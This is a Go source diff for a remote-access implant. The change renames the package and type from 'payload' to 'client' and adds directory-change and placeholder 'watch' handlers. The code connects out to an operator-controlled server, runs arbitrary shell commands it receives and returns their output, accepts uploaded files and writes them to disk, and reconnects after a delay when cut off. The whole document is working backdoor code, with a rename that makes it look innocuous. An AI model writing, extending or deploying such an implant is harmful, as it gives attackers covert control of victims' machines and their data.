@@ -1,4 +1,4 @@
-package payload
+package client
 
 import (
 	"bufio"
@@ -16,8 +16,8 @@ import (
 // when uploading a file
 const BufferSize = 1024
 
-// Payload needs description
-type Payload struct {
+// Client is
+type Client struct {
 	Port       int
 	Target     string
 	Conn       net.Conn
@@ -25,64 +25,95 @@ type Payload struct {
 }
 
 // Run executes the payload
-func (p *Payload) Run() {
-	addr := p.Target + ":" + strconv.Itoa(p.Port)
+func (c *Client) Run() {
+	addr := c.Target + ":" + strconv.Itoa(c.Port)
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		fmt.Println("[ERROR] dialing connection", err)
-		p.silentMode()
+		c.silentMode()
 	}
 	defer conn.Close()
 
-	p.Conn = conn
+	c.Conn = conn
 
 	for {
 		// commandByteBuffer is the firt 2 bytes being sent by the server
 		// we grab this to check if the server is sending over any special commands
 		// to upload a file or execute a program
 		commandByteBuffer := make([]byte, 2)
-		_, err := p.Conn.Read(commandByteBuffer)
+		_, err := c.Conn.Read(commandByteBuffer)
 		if err != nil {
-			p.silentMode()
+			c.silentMode()
 		}
 
 		switch {
 		case string(commandByteBuffer) == "u:":
-			p.receiveFile()
+			c.receiveFile()
+			break
+		case string(commandByteBuffer) == "w:":
+			c.watchEvent()
+			break
+		case string(commandByteBuffer) == "cd":
+			c.chDir(commandByteBuffer)
 			break
 		default:
 			// Wait for a message from the command control center
-			p.executeCommand(commandByteBuffer)
+			c.executeCommand(commandByteBuffer)
 		}
 	}
 }
 
-func (p *Payload) silentMode() {
-	time.Sleep(p.ReconnTime * time.Hour)
+func (c *Client) silentMode() {
+	time.Sleep(c.ReconnTime * time.Minute)
 
 	// reconnect
-	p.Run()
+	c.Run()
 }
 
-func (p *Payload) receiveFile() {
+func (c *Client) watchEvent() {
+	_, err := bufio.NewReader(c.Conn).ReadString('\r')
+	if err != nil {
+		c.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
+		return
+	}
+
+	c.Conn.Write([]byte("[*] functionality not implemented yet \n\r"))
+}
+
+func (c *Client) chDir(cmd []byte) {
+	dir, err := bufio.NewReader(c.Conn).ReadString('\r')
+	if err != nil {
+		c.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
+		return
+	}
+
+	if err := os.Chdir(strings.TrimSpace(dir)); err != nil {
+		c.Conn.Write([]byte("[ERROR] changing directories " + err.Error() + "\n\r"))
+		return
+	}
+
+	c.Conn.Write([]byte("changed into " + dir + "\r"))
+}
+
+func (c *Client) receiveFile() {
 	bufferFileName := make([]byte, 64)
 	bufferFileSize := make([]byte, 10)
 
-	p.Conn.Read(bufferFileSize)
+	c.Conn.Read(bufferFileSize)
 	fileSize, err := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
 	if err != nil {
-		p.Conn.Write([]byte("[ERROR] converting string to int " + err.Error() + "\n\r"))
+		c.Conn.Write([]byte("[ERROR] converting string to int " + err.Error() + "\n\r"))
 		fmt.Println(err)
 		return
 	}
 
-	p.Conn.Read(bufferFileName)
+	c.Conn.Read(bufferFileName)
 	fileName := strings.Trim(string(bufferFileName), ":")
 
 	newFile, err := os.Create(fileName)
 	if err != nil {
 		fmt.Println(err)
-		p.Conn.Write([]byte("[ERROR] creating file " + err.Error() + "\n\r"))
+		c.Conn.Write([]byte("[ERROR] creating file " + err.Error() + "\n\r"))
 		return
 	}
 	defer newFile.Close()
@@ -91,20 +122,20 @@ func (p *Payload) receiveFile() {
 
 	for {
 		if (fileSize - receivedBytes) < BufferSize {
-			io.CopyN(newFile, p.Conn, (fileSize - receivedBytes))
+			io.CopyN(newFile, c.Conn, (fileSize - receivedBytes))
 			break
 		}
-		io.CopyN(newFile, p.Conn, BufferSize)
+		io.CopyN(newFile, c.Conn, BufferSize)
 		receivedBytes += BufferSize
 	}
-	p.Conn.Write([]byte("Received file completely! \n\r"))
+	c.Conn.Write([]byte("Received file completely! \n\r"))
 }
 
-func (p *Payload) executeCommand(commandByteBuffer []byte) {
+func (c *Client) executeCommand(commandByteBuffer []byte) {
 	// read the incoming message
-	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
+	msg, err := bufio.NewReader(c.Conn).ReadString('\r')
 	if err != nil {
-		p.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
+		c.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
 		return
 	}
 
@@ -123,9 +154,9 @@ func (p *Payload) executeCommand(commandByteBuffer []byte) {
 	output, err := cmd.Output()
 	if err != nil {
 		// let the server know we could not execute the command
-		p.Conn.Write([]byte("Failed command: " + err.Error() + " \n\r"))
+		c.Conn.Write([]byte("Failed command: " + err.Error() + " \n\r"))
 		return
 	}
 	// send back the command output to the server
-	p.Conn.Write([]byte(string(output) + "\r"))
+	c.Conn.Write([]byte(string(output) + "\r"))
 }
